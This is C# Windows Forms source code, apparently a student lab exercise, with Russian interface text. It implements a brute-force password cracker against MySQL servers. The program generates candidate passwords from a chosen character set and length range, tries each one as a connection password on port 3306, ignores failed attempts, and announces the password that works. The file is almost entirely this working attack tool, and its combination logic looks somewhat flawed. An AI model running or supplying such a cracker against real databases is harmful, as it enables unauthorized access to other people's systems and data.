using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using MySqlConnector;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace lab3
{
    public partial class Form1 : Form
    {

        public static int combinations = 0;

        //current combination
        public static string combination = "";

        //password
        public static string password = "a";
        string[] letters_ =
         {
                    string.Empty, "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
                    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
                   
            };
        string[] digits =
         {
                    string.Empty, "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"
            };
        string[] letters_digits =
{
                    string.Empty, "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
                    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
                    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"
            };
        public Form1()
        {
            InitializeComponent();
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(textBox1.Text)==true || string.IsNullOrEmpty(textBox2.Text) == true || string.IsNullOrEmpty(textBox3.Text) == true)
            {
                MessageBox.Show("Введите, пожалуйста, все данные","WARNING",MessageBoxButtons.OK,MessageBoxIcon.Warning);
            }
            else
            {
                string path;
                string[] alphabet = letters_digits;
                if (comboBox1.SelectedIndex == 0) alphabet = digits;
                if (comboBox1.SelectedIndex == 1) alphabet = letters_;
                if (comboBox1.SelectedIndex == 2) alphabet = letters_digits;

                string[] pass_length = textBox4.Text.Split(new char[] { '-' }, StringSplitOptions.RemoveEmptyEntries);
                int[] passlen = Array.ConvertAll(pass_length, s => int.Parse(s));
                int letterarray = alphabet.Length;

                int[] letter = new int[passlen[1]];
                for(int a = 0; a < passlen[0]; a++)
                {
                    letter[a] = 1;
                }
                int i = 1;
                bool f = true;

                    while (i == 1)
                    {
                        for (int j = 0; j < passlen[1]; j++)
                        {
                            if (letter[j] == letterarray)
                            {
                                letter[j + 1]++;
                                letter[j] = 1;
                            }
                            if (letter[passlen[1] - 1] == letterarray)
                            {
                                MessageBox.Show("Пароль не удалось подобрать");
                                f = false;
                                break;
                            }
                            combination = combination + alphabet[letter[j]];
                        }
                        textBox5.Text += "Пробуем пароль: " + combination + "\n";
                        if (!f) break;
                        letter[0]++;
                    try
                        {
                            path = "server=" + textBox1.Text + ";user=" + textBox3.Text + ";database=" + textBox2.Text + ";password=" + combination + ";port=3306;";
                            MySqlConnection conn = new MySqlConnection(path);
                            conn.Open();
                            textBox5.Text += "Пароль подошел";
                            MessageBox.Show("Пароль подошел: " + combination);
                            break;
                        }
                        catch (Exception)
                        {
                        }
                        //Console.WriteLine(combination);
                        combination = "";
                    }
               



               /* for (int i = passlen[0]; i <= passlen[1]; i++)
                {
                    int size = i;
                    for (int j = 0; j < size - 1; j++)
                    {
                        
                    }
                }*/
            }



        }
    }
}
